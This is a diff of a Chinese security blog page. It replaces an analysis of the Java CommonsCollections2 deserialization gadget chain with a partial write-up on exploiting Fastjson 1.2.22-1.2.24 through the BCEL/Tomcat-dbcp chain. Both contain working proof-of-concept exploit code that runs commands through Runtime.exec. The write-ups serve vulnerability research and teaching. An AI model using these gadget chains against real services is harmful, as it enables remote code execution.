@@ -2,9 +2,9 @@
 <html>
 <head>
   <meta charset="utf-8">
-  <title>Java反序列化-CommonsCollections2分析 | 六月的雨</title>
+  <title>Java反序列化-Fastjson不出网利用 | 六月的雨</title>
   <meta name="keywords" content=" Hexo , Markdown ">
-  <meta name="description" content="Java反序列化-CommonsCollections2分析 | 六月的雨">
+  <meta name="description" content="Java反序列化-Fastjson不出网利用 | 六月的雨">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 <meta name="description" content="Fastjson不出网利用0x01 Teamplates   0x02 BCEL利⽤链—org.apache.tomcat.dbcp.dbcp2.BasicDataSource2.1 利⽤条件 ⽆需⽬标额外开启选项，也不⽤连接外部服务器 但需要应⽤部署在Tomcat应⽤环境中，因为Tomcat应⽤环境⾃带tomcat-dbcp.jar 对于SpringBoot这种⾃带Tomcat可以直接以单个ja">
 <meta property="og:type" content="article">
@@ -640,9 +640,9 @@
 </aside>
 <div id="post">
     <div class="pjax">
-        <article id="post-Java反序列化-CommonsCollections2分析" class="article article-type-post" itemscope itemprop="blogPost">
+        <article id="post-Java反序列化-Fastjson不出网利用" class="article article-type-post" itemscope itemprop="blogPost">
     
-        <h1 class="article-title">Java反序列化-CommonsCollections2分析</h1>
+        <h1 class="article-title">Java反序列化-Fastjson不出网利用</h1>
     
     <div class="article-meta">
         
@@ -669,12 +669,12 @@
     </div>
     <div class="article-meta">
         
-            Created At : <time class="date" title='Updated At: 2021-12-19 22:29:24'>2021-12-06 22:00</time>
+            Created At : <time class="date" title='Updated At: 2021-12-24 10:48:28'>2021-12-18 22:00</time>
         
     </div>
     <div class="article-meta">
         
-        <span>Count:3.5k</span>
+        <span>Count:1.3k</span>
         
         
         <span id="busuanzi_container_page_pv">
@@ -704,7 +704,7 @@
     
     <div class="toc-ref">
     
-        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96CommonsCollections2%E5%88%86%E6%9E%90"><span class="toc-text">Java反序列化CommonsCollections2分析</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01%E5%88%A9%E7%94%A8%E9%93%BE"><span class="toc-text">0x01利用链</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-javassist%E5%AD%A6%E4%B9%A0"><span class="toc-text">0x02 javassist学习</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-ClassLoader-defineClass"><span class="toc-text">0x03 ClassLoader#defineClass</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04-%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90%EF%BC%88%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%EF%BC%89%EF%BC%9A"><span class="toc-text">0x04 利用链分析（代码执行）：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x05-POC%EF%BC%9A"><span class="toc-text">0x05 POC：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x06-POC%E8%B0%83%E8%AF%95"><span class="toc-text">0x06 POC调试</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x07-%E7%96%91%E9%97%AE%E8%A7%A3%E7%AD%94%E8%AE%B0%E5%BD%95"><span class="toc-text">0x07 疑问解答记录</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5%EF%BC%9A"><span class="toc-text">参考链接：</span></a></li></ol></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Fastjson%E4%B8%8D%E5%87%BA%E7%BD%91%E5%88%A9%E7%94%A8"><span class="toc-text">Fastjson不出网利用</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-Teamplates"><span class="toc-text">0x01 Teamplates</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-BCEL%E5%88%A9%E2%BD%A4%E9%93%BE%E2%80%94org-apache-tomcat-dbcp-dbcp2-BasicDataSource"><span class="toc-text">0x02 BCEL利⽤链—org.apache.tomcat.dbcp.dbcp2.BasicDataSource</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-1-%E5%88%A9%E2%BD%A4%E6%9D%A1%E4%BB%B6"><span class="toc-text">2.1 利⽤条件</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-2-%E5%BD%B1%E5%93%8D%E7%89%88%E6%9C%AC"><span class="toc-text">2.2 影响版本</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-3-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0"><span class="toc-text">2.3 漏洞复现</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#POC%E5%88%86%E6%9E%90"><span class="toc-text">POC分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-4-%E8%B0%83%E8%AF%95%E5%88%86%E6%9E%90"><span class="toc-text">2.4 调试分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-4-%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90"><span class="toc-text">2.4 利用链分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BB%95%E8%BF%87-1-2-36-lt-fastjson-lt-1-2-37"><span class="toc-text">绕过 1.2.36&lt;&#x3D;fastjson&lt;1.2.37</span></a></li><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-text"></span></a></li></ol></li></ol>
     
 <style>
     .left-col .switch-btn,
@@ -720,348 +720,126 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h1 id="Java反序列化CommonsCollections2分析"><a href="#Java反序列化CommonsCollections2分析" class="headerlink" title="Java反序列化CommonsCollections2分析"></a>Java反序列化CommonsCollections2分析</h1><p>分析前说几句学习心得，我个人感觉学习各种利用链，</p>
-<p>第一，能够让你清晰了解到反序列化漏洞的原理、利用方式、漏洞危害怎么进行触发。</p>
-<p>第二，认识哪些JAVA常见的可以被人利用并产生危害的类。</p>
-<p>第三，POC的编写细节，再看别人的POC的时候，不是一味的照抄，而是每一句代码都要问自己，为什么要这么写，这样你才能够锻炼自己，如果没有POC的情况下，能够按照现有的利用链进行编写POC。</p>
-<p>闲话不多说了，开始进去分析。</p>
-<p>版本要求：</p>
-<ul>
-<li>DK版本：无要求</li>
-<li>CommonsCollections 4.0(cc3.1中TransformingComparator没有继承自Serializable所以无法进行Java反序列化)</li>
+        <h1 id="Fastjson不出网利用"><a href="#Fastjson不出网利用" class="headerlink" title="Fastjson不出网利用"></a>Fastjson不出网利用</h1><h2 id="0x01-Teamplates"><a href="#0x01-Teamplates" class="headerlink" title="0x01 Teamplates"></a>0x01 Teamplates</h2><ul>
+<li></li>
 </ul>
-<p>具备知识：</p>
-<ul>
-<li>反射</li>
-<li>动态代理</li>
-<li>javassist</li>
-<li>ClassLoader#defineClass</li>
-<li>TemplatesImpl</li>
+<h2 id="0x02-BCEL利⽤链—org-apache-tomcat-dbcp-dbcp2-BasicDataSource"><a href="#0x02-BCEL利⽤链—org-apache-tomcat-dbcp-dbcp2-BasicDataSource" class="headerlink" title="0x02 BCEL利⽤链—org.apache.tomcat.dbcp.dbcp2.BasicDataSource"></a>0x02 BCEL利⽤链—org.apache.tomcat.dbcp.dbcp2.BasicDataSource</h2><h2 id="2-1-利⽤条件"><a href="#2-1-利⽤条件" class="headerlink" title="2.1 利⽤条件"></a>2.1 利⽤条件</h2><ul>
+<li>⽆需⽬标额外开启选项，也不⽤连接外部服务器</li>
+<li>但需要应⽤部署在Tomcat应⽤环境中，因为Tomcat应⽤环境⾃带tomcat-dbcp.jar</li>
+<li>对于SpringBoot这种⾃带Tomcat可以直接以单个jar⽂件部署的需要在maven中配置tomcat-dbcp。</li>
+<li>⽽且对于不同的Tomcat版本使⽤的poc也不同：</li>
+<li>Tomcat 8.0以后使⽤ org.apache.tomcat.dbcp.dbcp2.BasicDataSource</li>
+<li>Tomcat 8.0以前使⽤ org.apache.tomcat.dbcp.dbcp.BasicDataSource</li>
+<li>JDK版本&lt; 8u251，在Java 8u251以后，bcel类被删除</li>
 </ul>
-<p>添加依赖：</p>
-<pre><code>&lt;dependency&gt;
-    &lt;groupId&gt;org.apache.commons&lt;/groupId&gt;
-    &lt;artifactId&gt;commons-collections4&lt;/artifactId&gt;
-    &lt;version&gt;4.0&lt;/version&gt;
-&lt;/dependency&gt;
-&lt;dependency&gt;
-    &lt;groupId&gt;org.javassist&lt;/groupId&gt;
-    &lt;artifactId&gt;javassist&lt;/artifactId&gt;
-    &lt;version&gt;3.25.0-GA&lt;/version&gt;
-&lt;/dependency&gt;
-</code></pre>
-<h2 id="0x01利用链"><a href="#0x01利用链" class="headerlink" title="0x01利用链"></a>0x01利用链</h2><pre><code>ObjectInputStream.readObject()
-    PriorityQueue.readObject()
-        PriorityQueue.heapify()
-            PriorityQueue.siftDown()
-                PriorityQueue.siftDownUsingComparator()
-                    TransformingComparator.compare()
-                       InvokerTransformer.transform()
-                                Method.invoke()
-                                    TemplatesImpl.newTransformer()
-                                         TemplatesImpl.getTransletInstance()
-                                         TemplatesImpl.defineTransletClasses
-                                         newInstance()
-                                            Runtime.exec()
-</code></pre>
-<h2 id="0x02-javassist学习"><a href="#0x02-javassist学习" class="headerlink" title="0x02 javassist学习"></a>0x02 javassist学习</h2><p>因为本次利用链需要用到，所以需要先了解一下javassist是干嘛的</p>
-<p>javassit是用于对生成的class文件进行修改，或以完全手动的方式，生成一个class文件。</p>
-<p>假设我们需要生成一个User类：</p>
-<pre><code class="java">public class User &#123;
-    private String name;
-
-    public User(String name) &#123;
-        this.name = name;
-    &#125;
-
-    public User() &#123;
-    &#125;
-
-    public String getName() &#123;
-        return name;
-    &#125;
-
-    public void setName(String name) &#123;
-        this.name = name;
-    &#125;
-
-    @Override
-    public String toString() &#123;
-        return &quot;name=&quot;+name;
-    &#125;
-&#125;
-</code></pre>
-<p>javassist创建代码如下：</p>
-<pre><code class="java">public class UserGenerator &#123;
-    public static void main(String[] args) throws Exception &#123;
-        ClassPool classPool = ClassPool.getDefault();
-        //定义User类
-        CtClass ctClassUser = classPool.makeClass(&quot;com.tianshouzhi.User&quot;);
-
-        //定义name字段
-        CtClass fieldType = classPool.get(&quot;java.lang.String&quot;);//字段类型
-        String name = &quot;name&quot;;//字段名称
-        CtField ctFieldName=new CtField(fieldType, name,ctClassUser);
-        ctFieldName.setModifiers(Modifier.PRIVATE);//设置访问修饰符
-        ctClassUser.addField(ctFieldName, CtField.Initializer.constant(&quot;javasssit&quot;));//添加name字段，赋值为javassist
-
-        //定义构造方法
-        CtClass[] parameters = new CtClass[]&#123;classPool.get(&quot;java.lang.String&quot;)&#125;;//构造方法参数
-        CtConstructor constructor=new CtConstructor(parameters,ctClassUser);
-        String body = &quot;&#123;this.name=$1;&#125;&quot;;//方法体 $1表示的第一个参数
-        constructor.setBody(body);
-        ctClassUser.addConstructor(constructor);
-
-        //setName getName方法
-        ctClassUser.addMethod(CtNewMethod.setter(&quot;setName&quot;,ctFieldName));
-        ctClassUser.addMethod(CtNewMethod.getter(&quot;getName&quot;,ctFieldName));
-
-        //toString方法
-        CtClass returnType = classPool.get(&quot;java.lang.String&quot;);
-        String methodName = &quot;toString&quot;;
-        CtMethod toStringMethod=new CtMethod(returnType, methodName, null,ctClassUser);
-        toStringMethod.setModifiers(Modifier.PUBLIC);
-        String methodBody = &quot;&#123;return \&quot;name=\&quot;+$0.name;&#125;&quot;;//$0表示的是this
-        toStringMethod.setBody(methodBody);
-        ctClassUser.addMethod(toStringMethod);
-
-        //代表class文件的CtClass创建完成，现在将其转换成class对象
-        Class clazz = ctClassUser.toClass();
-        Constructor cons = clazz.getConstructor(String.class);
-        Object user = cons.newInstance(&quot;wangxiaoxiao&quot;);
-        Method toString = clazz.getMethod(&quot;toString&quot;);
-        System.out.println(toString.invoke(user));
-
-        ctClassUser.writeFile(&quot;.&quot;);//在当前目录下，生成com/tianshouzhi/User.class文件
-    &#125;
-&#125;
-</code></pre>
-<p>运行程序后输出：</p>
-<p>name=wangxiaoxiao</p>
-<p>通过反编译工具(例如：JD-gui )打开User.class 可以看到类似以下代码：</p>
-<p><img src="https://cdn.jsdelivr.net/gh/JuneRainBlog/img@master/image-20211209225905013.png" alt="image-20211209225905013"></p>
-<h2 id="0x03-ClassLoader-defineClass"><a href="#0x03-ClassLoader-defineClass" class="headerlink" title="0x03 ClassLoader#defineClass"></a>0x03 ClassLoader#defineClass</h2><p>ClassLoader是Java的类加载器，负责将字节码转化成内存中的Java类。</p>
-<pre><code>public class JavasistTest &#123;
-
-   public static void main(String[] args) throws Exception&#123;
-       //使用Javasist生成一个.class文件
-       ClassPool pool = ClassPool.getDefault();
-       pool.insertClassPath(new ClassClassPath(AbstractTranslet.class));
-       CtClass test = pool.makeClass(&quot;Evil&quot;);
-       String name = &quot;Evil&quot; + System.nanoTime();
-       test.setName(name);
-       String cmd = &quot;System.out.println(\&quot;Hello,Javasist\&quot;);&quot;;
-       test.setSuperclass(pool.get(AbstractTranslet.class.getName()));
-       CtConstructor constructor = test.makeClassInitializer();
-       constructor.insertBefore(cmd);
-       test.writeFile(&quot;./&quot;);
-
-       byte[] bytes = test.toBytecode();//转换成字节码
-       Class clas = Class.forName(&quot;java.lang.ClassLoader&quot;);
-
-       Method defineclass = clas.getDeclaredMethod(&quot;defineClass&quot;, String.class, byte[].class, int.class, int.class);
-       defineclass.setAccessible(true);
-       Class claz = (Class) defineclass.invoke(ClassLoader.getSystemClassLoader(),&quot;Evil&quot;,bytes,0,bytes.length);
-       claz.newInstance();
-
-  &#125;
-&#125;
-</code></pre>
-<p>这里的ClassLoader#defineClass方法是protected所以我们无法直接从外部进行调用，所以我们这里需要借助反射来调用这个方法</p>
-<h2 id="0x04-利用链分析（代码执行）："><a href="#0x04-利用链分析（代码执行）：" class="headerlink" title="0x04 利用链分析（代码执行）："></a>0x04 利用链分析（代码执行）：</h2><p>这里才是真正的CC2，能够进行RCE。</p>
-<p>我们先分析后半条链，也就是如何触发RCE的。然后在拼接前半条链，我个人喜欢逆向先知道如何触发RCE，再找入口去调用后半条链。</p>
-<p>第一步：首先我们使用javassist，生成静态代码块，注意：静态代码块会在创建类实例的时候执行。</p>
-<pre><code>import javassist.ClassPool;
-import javassist.CtClass;
-
-public class test2 &#123;
-    public static void main(String[] args) throws Exception &#123;
-        ClassPool pool = ClassPool.getDefault();//返回默认的类池
-        CtClass cc = pool.makeClass(&quot;Cat&quot;);//创建一个新的public类
-        cc.makeClassInitializer().setBody(&quot;java.lang.Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;);
-        String randomClassName = &quot;EvilCat&quot; + System.nanoTime();
-        cc.setName(randomClassName);
-        // 写入.class 文件
-        cc.writeFile();
-    &#125;
-&#125;
-</code></pre>
-<p>使用jadx-gui查看生成的class文件</p>
-<p><img src="https://raw.githubusercontent.com/JuneRainBlog/img/master/image-20211208142627069.png" alt="image-20211208142627069"></p>
-<p>第二步：我们看回TemplatesImpl，主要是利用TemplatesImpl触发上面的静态代码块，形成后半条链，这个思路不能乱。</p>
-<p>TemplatesImpl#newTransformer()调用了getTransletInstance()：</p>
-<p><img src="https://raw.githubusercontent.com/JuneRainBlog/img/master/image-20211207155253060.png" alt="image-20211207155253060"></p>
-<p>跟进getTransletInstance(),先看一个方框，调用了defineTransletClasses(),这里第二个方框后续会执行，后面进行解释：</p>
-<p><img src="https://raw.githubusercontent.com/JuneRainBlog/img/master/image-20211207155417381.png" alt="image-20211207155417381"></p>
-<p>跟进defineTransletClasse()，这里通过loader.defineClass的方式将bytecodes还原为Class：</p>
-<p><img src="https://raw.githubusercontent.com/JuneRainBlog/img/master/image-20211207155753453.png" alt="image-20211207155753453"></p>
-<p>然后返回来看刚说到的第二个方框，调用了_class[_transletIndex].newInstance方法实例化还原的Class。此时static语句块成功执行。</p>
-<p>到这里我们的后半条利用链是：</p>
-<pre><code>TemplatesImpl.newTransformer()
-            TemplatesImpl.getTransletInstance()
-            TemplatesImpl.defineTransletClasses
-                  newInstance()
-                  静态代码块Runtime.exec()
-</code></pre>
-<p>我们需要想办法找到入口调用TemplatesImpl.newTransformer()，来拼接后半条链。</p>
-<p>这里使用了InvokerTransformer#transform的反射来调用TemplatesImpl#newtransformer。</p>
-<p>第三步：：TransformingComparator#compare方法，主要利用来调用InvokerTransformer#transform，然后拼接后半条链的</p>
-<p>TransformingComparator是一个修饰器，和CC1中的ChainedTransformer类似。</p>
-<p><img src="https://raw.githubusercontent.com/JuneRainBlog/img/master/image-20211207095605754.png" alt="image-20211207095605754"></p>
-<p>可以看到obj1是形参，这个是可控的，然后我们要判断this.transformer是否也是可控的，可以全局搜一下</p>
-<p><img src="https://raw.githubusercontent.com/JuneRainBlog/img/master/image-20211207095753071.png" alt="image-20211207095753071"></p>
-<p>找到可以使用TransformingComparator的构造器对this.transformer进行赋值，所以this.transformer是可控的，那this.transformer.transform(obj)。我们可以想办法变成InvokerTransformer.transform()，这个应该看起来很熟悉，就是cc1中的后半条链。</p>
-<p>第四步：我们需要找到可以调用TransformingComparator，并且重写了readObject作为入口的类，同时这个类也需要具备可序列化的要求。于是我们找到了PriorityQueue。</p>
-<p>PriorityQueue() 使用默认的初始容量（11）创建一个 PriorityQueue，并根据其自然顺序对元素进行排序。</p>
-<p>先查看PriorityQueue#readObject</p>
-<p><img src="https://raw.githubusercontent.com/JuneRainBlog/img/master/image-20211207100209490.png" alt="image-20211207100209490"></p>
-<p>第一个方框，是对对象s进行序列化，然后存放到数组queue[i]中，这里的queue[i]是序列化得来的，所以是可控的。</p>
-<p>第二个方框，调用了heapify()，我们跟进去</p>
-<p><img src="https://raw.githubusercontent.com/JuneRainBlog/img/master/image-20211207100452403.png" alt="image-20211207100452403"></p>
-<p>同上，queue[i]是可控的，跟进siftDown()</p>
-<p><img src="https://raw.githubusercontent.com/JuneRainBlog/img/master/image-20211207100532469.png" alt="image-20211207100532469"></p>
-<p>这里的形参E x就是上面的queue[i]，所以可控。当comparator不为null时，跟进siftDownUsingComparator()</p>
-<p><img src="https://raw.githubusercontent.com/JuneRainBlog/img/master/image-20211207100729212.png" alt="image-20211207100729212"></p>
-<p>发现在红框处调用了comparator的compare函数, 同上这里的 <code>x</code>是可控的，我们可以看一下comparator是否可控，搜一下，</p>
-<pre><code>private final Comparator&lt;? super E&gt; comparator;
-</code></pre>
-<p>找到comparator是一个参数，可以通过反射进行修改它的值，这里我们可以修改成TransformingComparator。</p>
-<h2 id="0x05-POC："><a href="#0x05-POC：" class="headerlink" title="0x05 POC："></a>0x05 POC：</h2><pre><code>import java.io.FileInputStream;
-import java.io.FileOutputStream;
-import java.io.ObjectInputStream;
-import java.io.ObjectOutputStream;
-import java.lang.reflect.Constructor;
-import java.lang.reflect.Field;
-import java.util.PriorityQueue;
-
-import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
-import javassist.ClassPool;
-import javassist.CtClass;
-import org.apache.commons.collections4.comparators.TransformingComparator;
-import org.apache.commons.collections4.functors.InvokerTransformer;
-
-public class cc2 &#123;
-
-    public static void main(String[] args) throws Exception &#123;
-        String AbstractTranslet=&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;;
-        String TemplatesImpl=&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;;
-
-        //动态创建一个静态代码块，内容是Runtime.getRuntime().exec(&quot;calc&quot;)
-        ClassPool classPool=ClassPool.getDefault();//返回默认的类池
-        classPool.appendClassPath(AbstractTranslet);//添加AbstractTranslet的搜索路径
-        CtClass payload=classPool.makeClass(&quot;cmd&quot;);//创建一个新的public类
-        payload.setSuperclass(classPool.get(AbstractTranslet));  
-        payload.makeClassInitializer().setBody(&quot;java.lang.Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;); // 创建 static 代码块，并插入代码
-        byte[] bytes=payload.toBytecode();//将动态代码块转换字节码赋予给byte数组
-
-        //反射获取_bytecodes的值，设置为转换后的静态代码块的字节码。_name也是一样的方式设置为test
-        Object templatesImpl= TemplatesImpl.class.newInstance();//反射创建TemplatesImpl实例，也就是获得一个对象
-        Field field=templatesImpl.getClass().getDeclaredField(&quot;_bytecodes&quot;);//反射获取templatesImpl的_bytecodes字段
-        field.setAccessible(true);//暴力反射
-        field.set(templatesImpl,new byte[][]&#123;bytes&#125;);//将templatesImpl上的_bytecodes字段设置为runtime的byte数组
-        Field field1=templatesImpl.getClass().getDeclaredField(&quot;_name&quot;);//反射获取templatesImpl的_name字段
-        field1.setAccessible(true);//暴力反射
-        field1.set(templatesImpl,&quot;test&quot;);//将templatesImpl上的_name字段设置为test
-
-        InvokerTransformer transformer=new InvokerTransformer(&quot;newTransformer&quot;,new Class[]&#123;&#125;,new Object[]&#123;&#125;);
-        TransformingComparator comparator =new TransformingComparator(transformer);//使用TransformingComparator修饰器传入transformer对象
-        PriorityQueue queue = new PriorityQueue(2);//使用指定的初始容量创建一个 PriorityQueue，并根据其自然顺序对元素进行排序。
-        queue.add(1);//添加数字1插入此优先级队列，这里的数字随便填，只是起到占位作用
-        queue.add(2);//
-
-        Field field2=queue.getClass().getDeclaredField(&quot;comparator&quot;);//获取PriorityQueue的comparator字段
-        field2.setAccessible(true);//暴力反射
-        field2.set(queue,comparator);//设置queue的comparator字段值为comparator
-
-        Field field3=queue.getClass().getDeclaredField(&quot;queue&quot;);//获取queue的queue字段
-        field3.setAccessible(true);//暴力反射
-        field3.set(queue,new Object[]&#123;templatesImpl,templatesImpl&#125;);//设置queue的queue字段内容Object数组，内容为templatesImpl
-
-        ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream(&quot;test.out&quot;));
-        outputStream.writeObject(queue);
-        outputStream.close();
-
-        ObjectInputStream inputStream=new ObjectInputStream(new FileInputStream(&quot;test.out&quot;));
-        inputStream.readObject();
-
-    &#125;
-&#125;
-</code></pre>
-<h2 id="0x06-POC调试"><a href="#0x06-POC调试" class="headerlink" title="0x06 POC调试"></a>0x06 POC调试</h2><p>如果前面利用链分析看不太懂，可以手动进行调式，可以加深对整条利用链形成的影响。</p>
-<p>从入口进行调试，使用readObject进行反序列化，这里调用的是PriorityQueue重写的的readobject</p>
-<pre><code>inputStream.readObject()
-</code></pre>
-<p><img src="https://raw.githubusercontent.com/JuneRainBlog/img/master/image-20211207171552395.png"></p>
-<p>PriorityQueue重写的的readobject会将序列化的字节码进行反序列化，然后赋给queue[i]，跟进heapify()：</p>
-<p><img src="https://raw.githubusercontent.com/JuneRainBlog/img/master/image-20211207171832993.png"></p>
-<p>调用了siftDown()，跟进siftDown()</p>
-<p><img src="https://raw.githubusercontent.com/JuneRainBlog/img/master/image-20211207171730170.png"></p>
-<p>调用了siftDownUsingComparator(k,x)，这里的x就是siftDown()中的queue[i]，所以是可控的。</p>
-<p>发现该方法会去调用comparator的compare,因为我们这里的compare是被TransformingComparator修饰过的InvokerTransformer实例化对象。所以这里调用的就是TransformingComparator的compare。这里比较绕，需要结合POC一起看才能理解。因为我们事先就设置好PriorityQueue方法中的compare值为TransformingComparator的compare了。</p>
-<p><img src="https://raw.githubusercontent.com/JuneRainBlog/img/master/image-20211207172625630.png"></p>
-<pre><code>InvokerTransformer transformer=new InvokerTransformer(&quot;newTransformer&quot;,new Class[]&#123;&#125;,new Object[]&#123;&#125;);
-TransformingComparator comparator =new TransformingComparator(transformer);
-PriorityQueue queue = new PriorityQueue(2);
-
-Field field2=queue.getClass().getDeclaredField(&quot;comparator&quot;);
-field2.setAccessible(true);
-field2.set(queue,comparator);
-</code></pre>
-<p>继续进到<code>TransformingComparator</code>的compare方法中。</p>
-<p>TransformingComparator#compare</p>
-<p><img src="https://raw.githubusercontent.com/JuneRainBlog/img/master/image-20211207172842788.png"></p>
-<p>跟进到方法里面，<code>this.iMethodName</code>内容为newTransformer反射调用了<code>newTransformer</code>方法。再跟进一下。</p>
-<p><img src="https://raw.githubusercontent.com/JuneRainBlog/img/master/image-20211207173108483.png"></p>
-<p>跟进templatesImpl#newTransformer</p>
-<p>这里比较关键了，我们为啥要进去这个方法getTransletInstance，我们先跟进getTransletInstance方法</p>
-<p><img src="https://raw.githubusercontent.com/JuneRainBlog/img/master/image-20211208112808772.png" alt="image-20211208112808772"></p>
-<p>第一条if (_name == nul) ，就立即返回，所以我们一开始就设置了__name为一个值，这个值填什么都可以</p>
-<p>第二条if是关键，这里的_class默认就是null，所以我们不需要进行设置。我们上面提问了为啥要进去这个方法getTransletInstance，主要是为了调用defineTransletClasses，然后通过defineTransletClasses去执行最终的代码块导致RCE。</p>
-<p>templatesImpl#getTransletInstance</p>
-<p><img src="https://raw.githubusercontent.com/JuneRainBlog/img/master/image-20211208112852872.png" alt="image-20211208112852872"></p>
-<p>方框内可以看到将_bytecodes赋值给_class,这里的_bytecodes就是我们设置好的静态代码块的字节码</p>
-<p>templatesImpl#defineTransletClasses</p>
-<p><img src="https://raw.githubusercontent.com/JuneRainBlog/img/master/image-20211208113438294.png" alt="image-20211208113438294"></p>
-<p>跟着调试F8，调回getTransletInstance方法，可以看到对_class进行了实例化，也就是这里触发了静态代码块的代码执行。</p>
-<p>templatesImpl#getTransletInstance</p>
-<p><img src="https://raw.githubusercontent.com/JuneRainBlog/img/master/image-20211208113732686.png" alt="image-20211208113732686"></p>
-<p><img src="https://raw.githubusercontent.com/JuneRainBlog/img/master/image-20211208113854787.png" alt="image-20211208113854787"></p>
-<h2 id="0x07-疑问解答记录"><a href="#0x07-疑问解答记录" class="headerlink" title="0x07 疑问解答记录"></a>0x07 疑问解答记录</h2><p>1.为什么要设置恶意类的父类为AbstractTranslet?</p>
-<p>在<code>TemplatesImpl</code>的 <code>defineTransletClasses()</code>函数中在利用defineClass获取到我们的字节码之后会对读取的字节码进行一个判断，判断是否继承自<code>AbstractTranslet</code>，所以我们在javasist生成字节码的时候要设置父类：</p>
-<p><img src="https://raw.githubusercontent.com/JuneRainBlog/img/master/image-20211208115229516.png" alt="image-20211208115229516"></p>
-<p>我们需要令_transletIndex为i，此时的i为0，默认状态下_transletIndex的值为-1，而如果_transletIndex的值小于0，就会抛出异常：</p>
-<p><img src="https://raw.githubusercontent.com/JuneRainBlog/img/master/image-20211208115307527.png" alt="image-20211208115307527"></p>
-<p>2.CC2链的poc利用代码中为什么要向queue队列中添加至少2个元素？并且PriorityQueue队列中的queue属性被transient关键字修饰具有“不会序列化”语义，在反序列化过程中为什么还能从流中读取queue的数据，流中的数据又从何而来？</p>
-<p>使用SerializationDumper工具解析对象序列化的数据，Fields字段中并没有看到PriorityQueue的queue属性，说明queue确实没有参与序列化，但是PriorityQueue重写了Serializable接口的writeObject和readObject方法实现自定义序列化与反序列化。</p>
-<p>工具链接：</p>
-<p><img src="https://raw.githubusercontent.com/JuneRainBlog/img/master/image-20211208161642509.png" alt="image-20211208161642509"></p>
-<p>PriorityQueue集合中的成员属性如下：</p>
-<pre><code class="java">public class PriorityQueue&lt;E&gt; extends AbstractQueue&lt;E&gt; implements java.io.Serializable &#123;
-    private static final long serialVersionUID = -7720805057305804111L;
-    private static final int DEFAULT_INITIAL_CAPACITY = 11;
-    private transient Object[] queue;
-    private int size = 0;
-    private final Comparator&lt;? super E&gt; comparator;
-    private transient int modCount = 0;
+<h2 id="2-2-影响版本"><a href="#2-2-影响版本" class="headerlink" title="2.2 影响版本"></a>2.2 影响版本</h2><p>Fastjson 1.2.22-1.2.24</p>
+<p>利⽤环境<br>jdk1.8.0_102、fastjson1.2.24、tomcat-dbcp9.0.20</p>
+<h2 id="2-3-漏洞复现"><a href="#2-3-漏洞复现" class="headerlink" title="2.3 漏洞复现"></a>2.3 漏洞复现</h2><p>POC：</p>
+<pre><code>public class POC&#123;
+    static&#123;
+        try&#123;
+            Runtime.getRuntime().exec(new String[]&#123;&quot;cmd&quot;, &quot;/c&quot;, &quot;calc&quot;&#125;);
+        &#125; catch (Exception e) &#123;        &#125;    &#125;
 
 &#125;
 </code></pre>
-<p>可以看到集合中的静态变量和被transient关键字修饰的成员变量不会参与序列化，最终只有size和comparator两个成员会参与序列化与反序列化过程。</p>
-<p>那原因是什么呢？我们可以查看PriorityQueue类，里面重写了的writeObject方法，发现对queue属性里的内容进行了序列化。</p>
-<p><img src="https://raw.githubusercontent.com/JuneRainBlog/img/master/image-20211208161936710.png" alt="image-20211208161936710"></p>
-<p>有同学可能会有疑惑：java序列化机制不允许被transient关键字修饰的成员属性参与序列化，那为啥还是能调用writeObject方法进行序列化？</p>
-<p>​        这里跟反射和封装性一样，存在其合理。如果使用默认的方式进行序列化（实现Serializable接口但不重写writeObject和readObject方法），transient关键字修饰的成员属性确实不会参与序列化，并且成员属性的内容也不会序列化。但是重写了writeObject和readObject方法就可以实现自定义序列化，调用writeObject方法并传入queue属性，这样的话queue中的内容依然会参与序列化。</p>
-<p>3.为什么为什么这里要put两个值进去?</p>
-<pre><code>queue.add(1);
-queue.add(2);
+<p>执行javac POC.java。生成POC.class文件</p>
+<p>Test：将上面的POC.class转为字节码形式</p>
+<pre><code>public class Test&#123;
+    public static void main(String[] args) throws IOException &#123;
+        Path path = Paths.get(&quot;C:\\Users\\20174\\IdeaProjects\\Jndi\\src\\main\\java\\com\\javaweb\\becl\\POC.class&quot;);
+        byte[] bytes = Files.readAllBytes(path);
+        System.out.println(bytes.length);
+        String result = Utility.encode(bytes,true);
+        BufferedWriter bw = new BufferedWriter(new FileWriter(&quot;D:\\res.txt&quot;));
+        bw.write(&quot;$$BCEL$$&quot; + result);        bw.close();    &#125;
+&#125;
 </code></pre>
